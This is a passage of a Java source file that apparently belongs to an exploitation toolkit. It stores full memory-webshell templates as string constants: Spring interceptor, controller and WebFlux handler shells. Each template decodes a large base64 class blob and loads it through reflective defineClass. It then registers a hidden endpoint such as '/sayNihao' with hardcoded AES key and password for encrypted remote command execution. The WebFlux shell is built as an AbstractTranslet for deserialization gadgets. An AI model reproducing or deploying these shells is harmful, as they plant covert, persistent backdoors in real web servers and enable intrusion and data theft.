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\");\n" +
            "                Class var3 = (Class) var1.invoke(Thread.currentThread().getContextClassLoader(), var2, 0, var2.length);\n" +
            "                MEMSHELL_OBJECT = var3.newInstance();\n" +
            "            } catch (Exception var4) {\n" +
            "            }\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        byte[] value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", (Class[]) null).invoke(base64, (Object[]) null);\n" +
            "            value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    static {\n" +
            "        new SpringInterceptorMemShell();\n" +
            "    }\n" +
            "}\n";

    public static final String SpringControllerMemShell =
            "import org.springframework.web.context.WebApplicationContext;\n" +
            "import org.springframework.web.context.request.RequestContextHolder;\n" +
            "import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;\n" +
            "import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;\n" +
            "import org.springframework.web.servlet.mvc.method.RequestMappingInfo;\n" +
            "import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;\n" +
            "\n" +
            "import java.lang.reflect.Method;\n" +
            "\n" +
            "public class SpringControllerMemShell {\n" +
            "    private static Object MEMSHELL_OBJECT;\n" +
            "    private static final String controller_name = \"memshell.SpringControllerShell\";\n" +
            "    private static final String method_name = \"a\";\n" +
            "\n" +
            "    public SpringControllerMemShell() {\n" +
            "        InjectMemClass();\n" +
            "        InjectMem();\n" +
            "    }\n" +
            "\n" +
            "    private static synchronized void InjectMem() {\n" +
            "        try {\n" +
            "            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0);\n" +
            "            // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean\n" +
            "            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);\n" +
            "            // 2. 通过反射获得自定义 controller 中test的 Method 对象\n" +
            "            Method method2 = MEMSHELL_OBJECT.getClass().getMethod(method_name);\n" +
            "            // 3. 定义访问 controller 的 URL 地址\n" +
            "            PatternsRequestCondition url = new PatternsRequestCondition(\"/sayNihao\");\n" +
            "            // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）\n" +
            "            RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();\n" +
            "            // 5. 在内存中动态注册 controller\n" +
            "            RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);\n" +
            "\n" +
            "            mappingHandlerMapping.registerMapping(info, MEMSHELL_OBJECT, method2);\n" +
            "        } catch (Exception e) {\n" +
            "\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void InjectMemClass() {\n" +
            "        try {\n" +
            "            MEMSHELL_OBJECT = Thread.currentThread().getContextClassLoader().loadClass(controller_name).newInstance();\n" +
            "        } catch (Exception var5) {\n" +
            "            try {\n" +
            "                Method var1 = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, Integer.TYPE, Integer.TYPE);\n" +
            "                var1.setAccessible(true);\n" +
            "                byte[] var2 = base64Decode(\"yv66vgAAADMBQAoAWgCdCACeCQBFAJ8IAKAJAEUAoQgAogkARQCjBwCkCgAIAJ0KAAgApQoACACmCgBFAKcJAEUAqAgAqQkARQCqCgBaAKsKAFoArAgArQoArgCvBwCwCgAvALEKABQAsgoArgCzCgCuALQHALUIALYKALcAuAoALwC5CgC3ALoHALsKALcAvAoAHgC9CgAeAL4KAC8AvwgAwAoALADBCADCBwDDCgAsAMQHAMUKAMYAxwoALgDICADJBwDKBwBuBwDLBwDMCADNCgAsAM4IAM8IANAIANEIANIIANMKANQA1QcA1goAOADXCgA4ANgIANkLANoA2wgA3AoALwDdCwDaAN4LANoA3woARQDgCgBFAOEIAOILAOMA5AcA5QoALADmCgBFAKsKAEUA5wsA4wDoCADpCwDaAOgHAOoKAEwAnQoALgDrCwDsAO0KAC8A7goA7wDwCgAuAKYKAEwA8QoARQDyCgAvAPMKAO8A9AoA7wD1CAD2CAD3BwD4AQACeGMBABJMamF2YS9sYW5nL1N0cmluZzsBAANQd2QBAARwYXRoAQADbWQ1AQACY3MBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAIExtZW1zaGVsbC9TcHJpbmdDb250cm9sbGVyU2hlbGw7AQAaKExqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBAAF6AQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAFRAQAVKFtCKUxqYXZhL2xhbmcvQ2xhc3M7AQACY2IBAAJbQgEAAXgBAAcoW0JaKVtCAQABYwEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEABHZhcjQBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAFzAQABbQEAAVoBAA1TdGFja01hcFRhYmxlBwDlBwD5BwC1AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAA3JldAcAzAEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAGYmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAR2YXI2AQACYnMBAAV2YWx1ZQEACkV4Y2VwdGlvbnMBAAxiYXNlNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZGVjb2RlcgEAAWEBAAZhcnJPdXQBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQABZgEAB3Nlc3Npb24BACBMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEABGRhdGEBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7BwD6BwD7BwD8AQAKU291cmNlRmlsZQEAGlNwcmluZ0NvbnRyb2xsZXJTaGVsbC5qYXZhDABhAGIBABAzYzZlMGI4YTljMTUyMjRhDABbAFwBAARwQVMzDABdAFwBABAvZmF2aWNvbmRlbW8uaWNvDABeAFwBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwA/QD+DAD/AQAMAF8AfAwAXwBcAQAFVVRGLTgMAGAAXAwAYQBoDAEBAQIBAANBRVMHAPkMAQMBBAEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMMAQUBBgwAYQEHDAEIAQkMAQoBCwEAE2phdmEvbGFuZy9FeGNlcHRpb24BAANNRDUHAQwMAQMBDQwBDgEPDAEQAREBABRqYXZhL21hdGgvQmlnSW50ZWdlcgwBEgEGDABhARMMAP8BFAwBFQEAAQAQamF2YS51dGlsLkJhc2U2NAwBFgEXAQAKZ2V0RW5jb2RlcgEAEltMamF2YS9sYW5nL0NsYXNzOwwBGAEZAQATW0xqYXZhL2xhbmcvT2JqZWN0OwcBGgwBGwEcDAEdAR4BAA5lbmNvZGVUb1N0cmluZwEAD2phdmEvbGFuZy9DbGFzcwEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQAWc3VuLm1pc2MuQkFTRTY0RW5jb2RlcgwBHwEgAQAGZW5jb2RlAQAKZ2V0RGVjb2RlcgEABmRlY29kZQEAFnN1bi5taXNjLkJBU0U2NERlY29kZXIBAAxkZWNvZGVCdWZmZXIHASEMASIBIwEAQG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9TZXJ2bGV0UmVxdWVzdEF0dHJpYnV0ZXMMASQBJQwBJgEnAQAQWC1SZXF1ZXN0ZWQtV2l0aAcA+gwBKAB8AQAOWE1MSFRUUFJlcXVlc3QMASkBKgwBKwEsDAEtAHwMAIoAiwwAbwBwAQAQbWVtc2hlbGwucGF5bG9hZAcA/AwBLgEvAQAebWVtc2hlbGwvU3ByaW5nQ29udHJvbGxlclNoZWxsDAEwATEMAGsAbAwBMgEzAQAKcGFyYW1ldGVycwEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtDAE0ATUHAPsMATYBNwwBOAE5BwE6DAE7ATwMAT0BBgwAgACBDAE4ARQMAT4AYgwBPwBiAQAOWG1sSFRUUFJlcXVlc3QBAAdTdWNjZXNzAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAtkZWZpbmVDbGFzcwEAFyhbQklJKUxqYXZhL2xhbmcvQ2xhc3M7AQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEACGdldEJ5dGVzAQAEKClbQgEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAEaW5pdAEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAHZG9GaW5hbAEABihbQilbQgEAG2phdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdAEAMShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAZsZW5ndGgBAAMoKUkBAAZ1cGRhdGUBAAcoW0JJSSlWAQAGZGlnZXN0AQAGKElbQilWAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQALdG9VcHBlckNhc2UBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQA8b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RDb250ZXh0SG9sZGVyAQAYY3VycmVudFJlcXVlc3RBdHRyaWJ1dGVzAQA9KClMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzOwEACmdldFJlcXVlc3QBACkoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEAC2dldFJlc3BvbnNlAQAqKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAJZ2V0SGVhZGVyAQAHaW5kZXhPZgEAFShMamF2YS9sYW5nL1N0cmluZzspSQEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAMZ2V0UGFyYW1ldGVyAQAMZ2V0QXR0cmlidXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAxzZXRBdHRyaWJ1dGUB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\");\n" +
            "                Class var3 = (Class) var1.invoke(Thread.currentThread().getContextClassLoader(), var2, 0, var2.length);\n" +
            "                MEMSHELL_OBJECT = var3.newInstance();\n" +
            "            } catch (Exception var4) {\n" +
            "            }\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        byte[] value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", (Class[]) null).invoke(base64, (Object[]) null);\n" +
            "            value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    static{\n" +
            "        new SpringControllerMemShell();\n" +
            "    }\n" +
            "}\n";

    public static final String SpringWebfluxHandlerMemShell=
            "import com.sun.org.apache.xalan.internal.xsltc.DOM;\n" +
            "import com.sun.org.apache.xalan.internal.xsltc.TransletException;\n" +
            "import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\n" +
            "import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;\n" +
            "import com.sun.org.apache.xml.internal.serializer.SerializationHandler;\n" +
            "import org.springframework.http.HttpStatus;\n" +
            "import org.springframework.http.ResponseEntity;\n" +
            "import org.springframework.web.bind.annotation.PostMapping;\n" +
            "import org.springframework.web.reactive.result.method.RequestMappingInfo;\n" +
            "import org.springframework.web.server.ServerWebExchange;\n" +
            "import reactor.core.publisher.Mono;\n" +
            "\n" +
            "import java.lang.reflect.Method;\n" +
            "import java.net.URL;\n" +
            "import java.net.URLClassLoader;\n" +
            "import java.util.HashMap;\n" +
            "import java.util.Map;\n" +
            "\n" +
            "\n" +
            "public class SpringWebfluxHandlerMemShell extends AbstractTranslet {\n" +
            "    public static Map<String, Object> store = new HashMap<String , Object>();\n" +
            "    public static String pass = \"pAS3\", md5, xc = \"3c6e0b8a9c15224a\";\n" +
            "\n" +
            "    public static String doInject(Object obj, String path) {\n" +
            "        String msg;\n" +
            "        try {\n" +
            "            md5 = md5(pass + xc);\n" +
            "            Method registerHandlerMethod = obj.getClass().getDeclaredMethod(\"registerHandlerMethod\", Object.class, Method.class, RequestMappingInfo.class);\n" +
            "            registerHandlerMethod.setAccessible(true);\n" +
            "            Method executeCommand = SpringWebfluxHandlerMemShell.class.getDeclaredMethod(\"xx\", ServerWebExchange.class);\n" +
            "            RequestMappingInfo requestMappingInfo = RequestMappingInfo.paths(path).build();\n" +
            "            registerHandlerMethod.invoke(obj, new SpringWebfluxHandlerMemShell(), executeCommand, requestMappingInfo);\n" +
            "            msg = \"ok\";\n" +
            "        } catch (Exception e) {\n" +
            "            e.printStackTrace();\n" +
            "            msg = \"error\";\n" +
            "        }\n" +
            "        return msg;\n" +
            "    }\n" +
            "\n" +
            "\n" +
            "    private static Class defineClass(byte[] classbytes) throws Exception {\n" +
            "        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());\n" +
            "        Method method = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
            "        method.setAccessible(true);\n" +
            "        return (Class) method.invoke(urlClassLoader, classbytes, 0, classbytes.length);\n" +
            "    }\n" +
            "\n" +
            "    public byte[] x(byte[] s, boolean m) {\n" +
            "        try {\n" +
            "            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(\"AES\");\n" +
            "            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), \"AES\"));\n" +
            "            return c.doFinal(s);\n" +
            "        } catch (Exception e) {\n" +
            "            return null;\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static String md5(String s) {\n" +
            "        String ret = null;\n" +
            "        try {\n" +
            "            java.security.MessageDigest m;\n" +
            "            m = java.security.MessageDigest.getInstance(\"MD5\");\n" +
            "            m.update(s.getBytes(), 0, s.length());\n" +
            "            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();\n" +
            "        } catch (Exception e) {\n" +
            "        }\n" +
            "        return ret;\n" +
            "    }\n" +
            "\n" +
            "    public static String base64Encode(byte[] bs) throws Exception {\n" +
            "        String value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object Encoder = base64.getMethod(\"getEncoder\", (Class[])null).invoke(base64, (Object[])null);\n" +
            "            value = (String)Encoder.getClass().getMethod(\"encodeToString\", byte[].class).invoke(Encoder, bs);\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Encoder\");\n" +
            "                Object Encoder = base64.newInstance();\n" +
            "                value = (String)Encoder.getClass().getMethod(\"encode\", byte[].class).invoke(Encoder, bs);\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        byte[] value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", (Class[])null).invoke(base64, (Object[])null);\n" +
            "            value = (byte[])((byte[])decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
